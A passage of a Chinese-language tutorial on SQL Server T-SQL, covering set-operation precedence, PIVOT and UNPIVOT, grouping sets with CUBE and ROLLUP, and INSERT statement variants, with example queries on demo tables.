<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- except </span></span><br><span class="line"><span class="keyword">select</span> country, region, city <span class="keyword">from</span> hr.Employees</span><br><span class="line"><span class="keyword">except</span></span><br><span class="line"><span class="keyword">select</span> country, region, city <span class="keyword">from</span> sales.Customers;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;执行结果如下图所示：</p>
<figure class="image-box">
                <img src="17.png" alt title class>
                <p></p>
            </figure>

<h2 id="集合运算优先级"><a href="#集合运算优先级" class="headerlink" title="集合运算优先级"></a>集合运算优先级</h2><figure class="image-box">
                <img src="18.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;SQL 定义了集合运算之间的优先级：<code>INTERSECT</code>最高，<code>UNION</code>和<code>EXCEPT</code>相等。<br>&emsp;&emsp;换句话说：首先会计算<code>INTERSECT</code>，然后按照从左至右的出现顺序依次处理优先级相同的运算。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 集合运算的优先级</span></span><br><span class="line"><span class="keyword">select</span> country, region, city <span class="keyword">from</span> Production.Suppliers</span><br><span class="line"><span class="keyword">except</span></span><br><span class="line"><span class="keyword">select</span> country, region, city <span class="keyword">from</span> hr.Employees</span><br><span class="line"><span class="keyword">intersect</span></span><br><span class="line"><span class="keyword">select</span> country, region, city <span class="keyword">from</span> sales.Customers;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;上面这段 SQL 代码，因为<code>INTERSECT</code>优先级比<code>EXCEPT</code>高，所以首先进行<code>INTERSECT</code>交集运算。因此，这个查询的含义是：返回没有出现在员工地址和客户地址交集中的供应商地址。</p>
<h2 id="使用表表达式避开不支持的逻辑查询处理"><a href="#使用表表达式避开不支持的逻辑查询处理" class="headerlink" title="使用表表达式避开不支持的逻辑查询处理"></a>使用表表达式避开不支持的逻辑查询处理</h2><p>&emsp;&emsp;集合运算查询本身并不支持除<code>ORDER BY</code>以外的其他逻辑查询处理阶段，但可以通过表表达式来避开这一限制。<br>&emsp;&emsp;解决方案就是：首先根据包含集合运算的查询定义一个表表达式，然后在外部查询中对表表达式应用任何需要的逻辑查询处理。<br>（1）例如，下面的查询返回每个国家中不同的员工地址或客户地址的数量：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> country, <span class="keyword">COUNT</span>(*) <span class="keyword">as</span> numlocations</span><br><span class="line"><span class="keyword">from</span> (<span class="keyword">select</span> country, region, city <span class="keyword">from</span> hr.Employees</span><br><span class="line">      <span class="keyword">union</span></span><br><span class="line">      <span class="keyword">select</span> country, region, city <span class="keyword">from</span> sales.Customers) <span class="keyword">as</span> U</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> country;</span><br></pre></td></tr></table></figure>

<p>（2）例如，下面的查询返回由员工地址为 3 或 5 的员工最近处理过的两个订单：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> empid,orderid,orderdate </span><br><span class="line"><span class="keyword">from</span> (<span class="keyword">select</span> top (<span class="number">2</span>) empid,orderid,orderdate </span><br><span class="line">    <span class="keyword">from</span> sales.Orders</span><br><span class="line">    <span class="keyword">where</span> empid=<span class="number">3</span></span><br><span class="line">    <span class="keyword">order</span> <span class="keyword">by</span> orderdate <span class="keyword">desc</span>,orderid <span class="keyword">desc</span>) <span class="keyword">as</span> D1</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> empid,orderid,orderdate </span><br><span class="line"><span class="keyword">from</span> (<span class="keyword">select</span> top (<span class="number">2</span>) empid,orderid,orderdate </span><br><span class="line">    <span class="keyword">from</span> sales.Orders</span><br><span class="line">    <span class="keyword">where</span> empid=<span class="number">5</span></span><br><span class="line">    <span class="keyword">order</span> <span class="keyword">by</span> orderdate <span class="keyword">desc</span>,orderid <span class="keyword">desc</span>) <span class="keyword">as</span> D2;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="透视、逆透视及分组"><a href="#透视、逆透视及分组" class="headerlink" title="透视、逆透视及分组"></a>透视、逆透视及分组</h1><h2 id="透视"><a href="#透视" class="headerlink" title="透视"></a>透视</h2><p>&emsp;&emsp;所谓透视（Pivoting）就是把数据从行的状态旋转为列的状态的处理。其处理步骤为：</p>
<figure class="image-box">
                <img src="19.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;相信很多人在笔试或面试的时候被问到如何通过 SQL 实现行转列或列转行的问题，可能很多人当时懵逼了，没关系，下面我们通过例子来理解。<br>（1）准备数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--1.0准备数据</span></span><br><span class="line"><span class="keyword">USE</span> tempdb;</span><br><span class="line"></span><br><span class="line">IF OBJECT_ID('dbo.Orders', 'U') IS NOT NULL <span class="keyword">DROP</span> <span class="keyword">TABLE</span> dbo.Orders;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> dbo.Orders</span><br><span class="line">(</span><br><span class="line">  orderid   <span class="built_in">INT</span>        <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  orderdate <span class="built_in">DATE</span>       <span class="keyword">NOT</span> <span class="literal">NULL</span>, <span class="comment">-- prior to SQL Server 2008 use DATETIME</span></span><br><span class="line">  empid     <span class="built_in">INT</span>        <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  custid    <span class="built_in">VARCHAR</span>(<span class="number">5</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  qty       <span class="built_in">INT</span>        <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="keyword">CONSTRAINT</span> PK_Orders PRIMARY <span class="keyword">KEY</span>(orderid)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> dbo.Orders(orderid, orderdate, empid, custid, qty)</span><br><span class="line"><span class="keyword">VALUES</span></span><br><span class="line">  (<span class="number">30001</span>, <span class="string">'20070802'</span>, <span class="number">3</span>, <span class="string">'A'</span>, <span class="number">10</span>),</span><br><span class="line">  (<span class="number">10001</span>, <span class="string">'20071224'</span>, <span class="number">2</span>, <span class="string">'A'</span>, <span class="number">12</span>),</span><br><span class="line">  (<span class="number">10005</span>, <span class="string">'20071224'</span>, <span class="number">1</span>, <span class="string">'B'</span>, <span class="number">20</span>),</span><br><span class="line">  (<span class="number">40001</span>, <span class="string">'20080109'</span>, <span class="number">2</span>, <span class="string">'A'</span>, <span class="number">40</span>),</span><br><span class="line">  (<span class="number">10006</span>, <span class="string">'20080118'</span>, <span class="number">1</span>, <span class="string">'C'</span>, <span class="number">14</span>),</span><br><span class="line">  (<span class="number">20001</span>, <span class="string">'20080212'</span>, <span class="number">2</span>, <span class="string">'B'</span>, <span class="number">12</span>),</span><br><span class="line">  (<span class="number">40005</span>, <span class="string">'20090212'</span>, <span class="number">3</span>, <span class="string">'A'</span>, <span class="number">10</span>),</span><br><span class="line">  (<span class="number">20002</span>, <span class="string">'20090216'</span>, <span class="number">1</span>, <span class="string">'C'</span>, <span class="number">20</span>),</span><br><span class="line">  (<span class="number">30003</span>, <span class="string">'20090418'</span>, <span class="number">2</span>, <span class="string">'B'</span>, <span class="number">15</span>),</span><br><span class="line">  (<span class="number">30004</span>, <span class="string">'20070418'</span>, <span class="number">3</span>, <span class="string">'C'</span>, <span class="number">22</span>),</span><br><span class="line">  (<span class="number">30007</span>, <span class="string">'20090907'</span>, <span class="number">3</span>, <span class="string">'D'</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> dbo.Orders;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这里使用了 MS SQL2008 的<code>VALUES</code>子句格式语法，这是 2008 版本的新特性。如果你使用的是 2005 及以下版本，你需要多个<code>INSERT</code>语句。最后的执行结果如下图所示：</p>
<figure class="image-box">
                <img src="20.png" alt title class>
                <p></p>
            </figure>

<p>（2）需求说明<br>&emsp;&emsp;假设我们要生成一个报表，包含每个员工和客户组合之间的总订货量。用以下简单的分组查询可以解决这个问题：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> empid,custid,<span class="keyword">SUM</span>(qty) <span class="keyword">as</span> sumqty </span><br><span class="line"><span class="keyword">from</span> dbo.Orders</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> empid,custid;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;该查询的执行结果如下：</p>
<figure class="image-box">
                <img src="21.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;不过，假设现在要求要按下表所示的的格式来生成输出结果：</p>
<figure class="image-box">
                <img src="22.png" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;这时，我们就需要进行透视转换了！</p>
<p>（3）使用<strong>标准 SQL</strong> 进行透视转换<br>&emsp;&emsp;Step1. 分组：<code>GROUP BY empid</code>；<br>&emsp;&emsp;Step2. 扩展：<code>CASE WHEN custid=&#39;A&#39; THEN qty END</code>；<br>&emsp;&emsp;Step3. 聚合：<code>SUM(CASE WHEN custid=&#39;A&#39; THEN qty END)</code>；</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--1.1标准SQL透视转换</span></span><br><span class="line"><span class="keyword">select</span> empid,</span><br><span class="line">    <span class="keyword">SUM</span>(<span class="keyword">case</span> <span class="keyword">when</span> custid=<span class="string">'A'</span> <span class="keyword">then</span> qty <span class="keyword">end</span>) <span class="keyword">as</span> A,</span><br><span class="line">    <span class="keyword">SUM</span>(<span class="keyword">case</span> <span class="keyword">when</span> custid=<span class="string">'B'</span> <span class="keyword">then</span> qty <span class="keyword">end</span>) <span class="keyword">as</span> B,</span><br><span class="line">    <span class="keyword">SUM</span>(<span class="keyword">case</span> <span class="keyword">when</span> custid=<span class="string">'C'</span> <span class="keyword">then</span> qty <span class="keyword">end</span>) <span class="keyword">as</span> C,</span><br><span class="line">    <span class="keyword">SUM</span>(<span class="keyword">case</span> <span class="keyword">when</span> custid=<span class="string">'D'</span> <span class="keyword">then</span> qty <span class="keyword">end</span>) <span class="keyword">as</span> D</span><br><span class="line"><span class="keyword">from</span> dbo.Orders</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> empid;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;执行结果如下图所示：</p>
<figure class="image-box">
                <img src="23.png" alt title class>
                <p></p>
            </figure>

<p>（4）使用 T-SQL <code>PIVOT</code>运算符进行透视转换<br>&emsp;&emsp;自 SQL Server 2005 开始引入了一个 T-SQL 独有的表运算符<code>PIVOT</code>，它可以对某个源表或表表达式进行操作、透视数据，再返回一个结果表。<br>&emsp;&emsp;<code>PIVOT</code>运算符同样涉及前面介绍的三个逻辑处理阶段（分组、扩展和聚合）以及同样的透视转换元素，但使用的是不同的、<strong>SQL Server 原生的语法</strong>。<br>&emsp;&emsp;下面是使用<code>PIVOT</code>运算符实现上面一样的效果：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> empid,A,B,C,D</span><br><span class="line"><span class="keyword">from</span> (<span class="keyword">select</span> empid,custid,qty</span><br><span class="line">      <span class="keyword">from</span> dbo.Orders) <span class="keyword">as</span> D</span><br><span class="line">  <span class="keyword">pivot</span> (<span class="keyword">sum</span>(qty) <span class="keyword">for</span> custid <span class="keyword">in</span> (A,B,C,D)) <span class="keyword">as</span> P;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;其中，<code>PIVOT</code>运算符的圆括号内要指定聚合函数（本例中<code>SUM</code>）、聚合元素（本例中的 qty）、扩展元素（custid）以及目标列名称的列表（本例中的 A、B、C、D）。在<code>PIVOT</code>运算符的圆括号后面，可以为结果表制定一个别名。</p>
<blockquote>
<p>&emsp;&emsp;<strong>Tips</strong>：使用<code>PIVOT</code>运算符一般不直接把它应用到源表（本例中的 Orders 表），而是将其应用到一个表表达式（该表表达式只包含透视转换需要的3种元素，不包含其他属性。）此外，不需要为它显式地指定分组元素，也就不需要再查询中使用<code>GROUP BY</code>子句。</p>
</blockquote>
<h2 id="逆透视"><a href="#逆透视" class="headerlink" title="逆透视"></a>逆透视</h2><p>&emsp;&emsp;所谓逆透视（Unpivoting）转换是一种把数据从列的状态旋转为行的状态的技术，它将来自单个记录中多个列的值扩展为单个列中具有相同值得多个记录。换句话说，将透视表中的每个源行潜在地转换成多个行，每行代表源透视表的一个指定的列值。</p>
<p>还是通过一个栗子来理解：<br>（1）首先还是准备一下数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">USE</span> tempdb;</span><br><span class="line"></span><br><span class="line">IF OBJECT_ID('dbo.EmpCustOrders', 'U') IS NOT NULL <span class="keyword">DROP</span> <span class="keyword">TABLE</span> dbo.EmpCustOrders;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> empid, A, B, C, D</span><br><span class="line"><span class="keyword">INTO</span> dbo.EmpCustOrders</span><br><span class="line"><span class="keyword">FROM</span> (<span class="keyword">SELECT</span> empid, custid, qty</span><br><span class="line">      <span class="keyword">FROM</span> dbo.Orders) <span class="keyword">AS</span> D</span><br><span class="line">  <span class="keyword">PIVOT</span>(<span class="keyword">SUM</span>(qty) <span class="keyword">FOR</span> custid <span class="keyword">IN</span>(A, B, C, D)) <span class="keyword">AS</span> P;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> dbo.EmpCustOrders;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;下面是对这个表 EmpCustOrders 的查询结果：</p>
<figure class="image-box">
                <img src="24.png" alt title class>
                <p></p>
            </figure>

<p>（2）需求说明<br>&emsp;&emsp;要求执行你透视转换，为每个员工和客户组合返回一行记录，其中包含这一组合的订货量。期望的输出结果如下图所示：</p>
<figure class="image-box">
                <img src="25.png" alt title class>
                <p></p>
            </figure>

<p>（3）标准 SQL 进行逆透视转换<br>&emsp;&emsp;Step1. 生成副本：<code>CROSS JOIN</code>交叉联接生成多个副本<br>&emsp;&emsp;Step2. 提取元素：通过<code>CASE</code>语句生成 qty 数据列<br>&emsp;&emsp;Step3. 删除不相关的交叉：过滤掉 <em>NULL</em> 值</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *</span><br><span class="line"><span class="keyword">from</span> (<span class="keyword">select</span> empid, custid,</span><br><span class="line">        <span class="keyword">case</span> custid</span><br><span class="line">            <span class="keyword">when</span> <span class="string">'A'</span> <span class="keyword">then</span> A</span><br><span class="line">            <span class="keyword">when</span> <span class="string">'B'</span> <span class="keyword">then</span> B</span><br><span class="line">            <span class="keyword">when</span> <span class="string">'C'</span> <span class="keyword">then</span> C</span><br><span class="line">            <span class="keyword">when</span> <span class="string">'D'</span> <span class="keyword">then</span> D</span><br><span class="line">        <span class="keyword">end</span> <span class="keyword">as</span> qty</span><br><span class="line">      <span class="keyword">from</span> dbo.EmpCustOrders</span><br><span class="line">        <span class="keyword">cross</span> <span class="keyword">join</span> (<span class="keyword">VALUES</span>(<span class="string">'A'</span>),(<span class="string">'B'</span>),(<span class="string">'C'</span>),(<span class="string">'D'</span>)) <span class="keyword">as</span> Custs(custid)) <span class="keyword">as</span> D</span><br><span class="line"><span class="keyword">where</span> qty <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;执行结果如下图所示：</p>
<figure class="image-box">
                <img src="26.png" alt title class>
                <p></p>
            </figure>

<p>（4）T-SQL <code>UNPIVOT</code>运算符进行逆透视转换<br>&emsp;&emsp;和<code>PIVOT</code>类似，在 SQL Server 2005 引入了一个<code>UNPIVOT</code>运算符，它的作用刚好和<code>PIVOT</code>运算符相反，即我们可以拿来做逆透视转换工作。<code>UNPIVOT</code>同样会经历我们上面提到的三个阶段。继续上面的栗子，我们使用<code>UNPIVOT</code>来进行逆透视转换：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> empid, custid, qty</span><br><span class="line"><span class="keyword">from</span> dbo.EmpCustOrders</span><br><span class="line">  <span class="keyword">unpivot</span> (qty <span class="keyword">for</span> custid <span class="keyword">in</span> (A,B,C,D)) <span class="keyword">as</span> U;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;其中，<code>UNPIVOT</code>运算符后边的括号内包括：用于保存源表列值的目标列明（这里是 qty），用于保存源表列名的目标列名（这里是 custid），以及源表列名列表（A、B、C、D）。同样，在<code>UNPIVOT</code>括号后面也可以跟一个别名。</p>
<blockquote>
<p>&emsp;&emsp;<strong>Tips</strong>：对经过透视转换所得的表再进行逆透视转换，并不能得到原来的表。因为你透视转换只是把经过透视转换的值再旋转岛另一种新的格式。</p>
</blockquote>
<h2 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h2><p>&emsp;&emsp;首先了解一下分组集：分组集就是分组（<code>GROUP BY</code>子句）使用的一组属性（或列名）。在传统 SQL 中，一个聚合查询只能定义一个分组集。为了灵活而有效地处理分组集，SQL Server 2008 引入了几个重要的新功能（<strong>它们都是<code>GROUP BY</code>的从属子句，需要依赖于<code>GROUP BY</code>子句</strong>）：<br>（1）<code>GROUPING SETS</code>从属子句<br>&emsp;&emsp;使用该子句，可以方便地在同一个查询中定义多个分组集。例如下面，我们定义了4个分组集：(empid,custid)，(empid)，(custid) 和 ()：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--3.1GROUPING SETS从属子句</span></span><br><span class="line"><span class="keyword">select</span> empid,custid,<span class="keyword">SUM</span>(qty) <span class="keyword">as</span> sumqty</span><br><span class="line"><span class="keyword">from</span> dbo.Orders</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> </span><br><span class="line">  <span class="keyword">GROUPING</span> <span class="keyword">SETS</span></span><br><span class="line">  (</span><br><span class="line">    (empid,custid),</span><br><span class="line">    (empid),</span><br><span class="line">    (custid),</span><br><span class="line">    ()</span><br><span class="line">   );</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这个查询相当于执行了四个 group by 查询的并集。</p>
<p>（2）<code>CUBE</code>从属子句<br>&emsp;&emsp;<code>CUBE</code>子句为定义多个分组集提供了一种更简略的方法，可以把<code>CUBE</code>子句看作是用于生成分组的幂集。例如：<code>CUBE(a,b,c)</code>等价于<code>GROUPING SETS[(a,b,c),(a,b),(a,c),(b,c),(a),(b),(c),()]</code>。下面我们用<code>CUBE</code>来实现上面的例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--3.2CUEE从属子句</span></span><br><span class="line"><span class="keyword">select</span> empid,custid,<span class="keyword">SUM</span>(qty) <span class="keyword">as</span> sumqty</span><br><span class="line"><span class="keyword">from</span> dbo.Orders</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">cube</span>(empid,custid);</span><br></pre></td></tr></table></figure>

<p>（3）<code>ROLLUP</code>从属子句<br>&emsp;&emsp;<code>ROLLUP</code>子句也是一种简略的方法，只不过它与<code>CUBE</code>不同，它强调输入成员之间存在一定的层次关系，从而生成让这种层次关系有意义的所有分组集。例如：<code>CUBE(a,b,c)</code>会生成 8 个可能的分组集，而<code>ROLLUP</code>则认为 3 个输入成员存在 a &gt; b &gt; c 的层次关系，所以只会生成4个分组集：(a,b,c)，(a,b)，(a)，()。<br>&emsp;&emsp;下面我们假设想要按时间层次关系：订单年份 &gt; 订单月份 &gt; 订单日，以这样的关系来定义所有分组集，并未每个分组集返回其总订货量。可能我们用<code>GROUPING SETS</code>需要 4 行，然后使用<code>ROLLUP</code>却只需要一行：<code>group by rollup(YEAR(orderdate),MONTH(orderdate),DAY(orderdate));</code><br>&emsp;&emsp;完整SQL查询如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--3.3ROLLUP从属子句</span></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">  <span class="keyword">YEAR</span>(orderdate) <span class="keyword">as</span> orderyear,</span><br><span class="line">  <span class="keyword">MONTH</span>(orderdate) <span class="keyword">as</span> ordermonth,</span><br><span class="line">  <span class="keyword">DAY</span>(orderdate) <span class="keyword">as</span> orderday,</span><br><span class="line">  <span class="keyword">SUM</span>(qty) <span class="keyword">as</span> sumqty</span><br><span class="line"><span class="keyword">from</span> dbo.Orders</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">rollup</span>(<span class="keyword">YEAR</span>(orderdate),<span class="keyword">MONTH</span>(orderdate),<span class="keyword">DAY</span>(orderdate));</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;执行结果如下图所示：</p>
<figure class="image-box">
                <img src="27.png" alt title class>
                <p></p>
            </figure>

<p>（4）<code>GROUPING_ID</code>函数<br>&emsp;&emsp;如果一个查询定义了多个分组集，还想把结果行和分组集关联起来，也就是说，为每个结果行标注它是和哪个分组集关联的。SQL Server 2008 中引入了一个<code>GROUPING_ID</code>函数，简化了关联结果行和分组集的处理，可以容易地计算出每一行和哪个分组集相关联。<br>&emsp;&emsp;例如，继续上面的例子，我们想要将 empid，custid 作为输入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> </span><br><span class="line">  <span class="keyword">grouping_id</span>(empid,custid) <span class="keyword">as</span> groupingset,</span><br><span class="line">  empid, custid, <span class="keyword">SUM</span>(qty) <span class="keyword">as</span> sumqty</span><br><span class="line"><span class="keyword">from</span> dbo.Orders</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">cube</span>(empid,custid);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;执行结果中会出现 groupingset 为 0，1，2，3 ，分别代表了 empid，custid 的4个可能的分组集 (empid,custid)，(empid)，(custid)，() 。</p>
<hr>
<h1 id="数据修改"><a href="#数据修改" class="headerlink" title="数据修改"></a>数据修改</h1><h2 id="插入与删除数据"><a href="#插入与删除数据" class="headerlink" title="插入与删除数据"></a>插入与删除数据</h2><h3 id="看我花式插入数据"><a href="#看我花式插入数据" class="headerlink" title="看我花式插入数据"></a>看我花式插入数据</h3><p>&emsp;&emsp;① <code>INSERT VALUES</code>语句 ：这个语句恐怕我们再熟悉不过了吧，在任何一本数据库的书上面都可以看到这个语句的身影。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> dbo.Orders(orderid, orderdate, empid, custid)</span><br><span class="line">  <span class="keyword">VALUES</span>(<span class="number">10001</span>, <span class="string">'20090212'</span>, <span class="number">3</span>, <span class="string">'A'</span>);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;需要了解的是，前面也提到过，SQL Server 2008 增强了<code>VALUES</code>语句的功能，允许在一条语句中指定由逗号分隔开的多行记录。例如下面的语句向 Orders 中插入了 4 行数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> dbo.Orders</span><br><span class="line">  (orderid, orderdate, empid, custid)</span><br><span class="line"><span class="keyword">VALUES</span></span><br><span class="line">  (<span class="number">10003</span>, <span class="string">'20090213'</span>, <span class="number">4</span>, <span class="string">'B'</span>),</span><br><span class="line">  (<span class="number">10004</span>, <span class="string">'20090214'</span>, <span class="number">1</span>, <span class="string">'A'</span>),</span><br><span class="line">  (<span class="number">10005</span>, <span class="string">'20090213'</span>, <span class="number">1</span>, <span class="string">'C'</span>),</span><br><span class="line">  (<span class="number">10006</span>, <span class="string">'20090215'</span>, <span class="number">3</span>, <span class="string">'C'</span>);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;② <code>INSERT SELECT</code>语句 ：将一组由<code>SELECT</code>查询返回的结果行插入到目标表中。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> dbo.Orders(orderid, orderdate, empid, custid)</span><br><span class="line">  <span class="keyword">SELECT</span> orderid, orderdate, empid, custid</span><br><span class="line">  <span class="keyword">FROM</span> TSQLFundamentals2008.Sales.Orders</span><br><span class="line">  <span class="keyword">WHERE</span> shipcountry = <span class="string">'UK'</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;③ <code>INSERT EXEC</code>语句：将存储过过程或动态 SQL 批处理返回的结果集插入目标表。<br>&emsp;&emsp;下面的示例演示了如何执行存储过程 usp_getorders 并将结果插入到 Orders 表中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> dbo.Orders(orderid, orderdate, empid, custid)</span><br><span class="line">  EXEC TSQLFundamentals2008.Sales.usp_getorders @country = <span class="string">'France'</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;④ <code>SELECT INTO</code>语句：它会创建一个目标表，并用查询返回的结果来填充它。需要注意的是：<strong>它不是一个标准的 SQL 语句（即不是 ANSI SQL 标准的一部分），不能用这个语句向已经存在的表中插入数据。</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--保证目标表不存在</span></span><br><span class="line">IF OBJECT_ID('dbo.Orders', 'U') IS NOT NULL <span class="keyword">DROP</span> <span class="keyword">TABLE</span> dbo.Orders;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> orderid, orderdate, empid, custid</span><br><span class="line"><span class="keyword">INTO</span> dbo.Orders</span><br><span class="line"><span class="keyword">FROM</span> TSQLFundamentals2008.Sales.Orders;</span><br></pre></td></tr></table></figure>

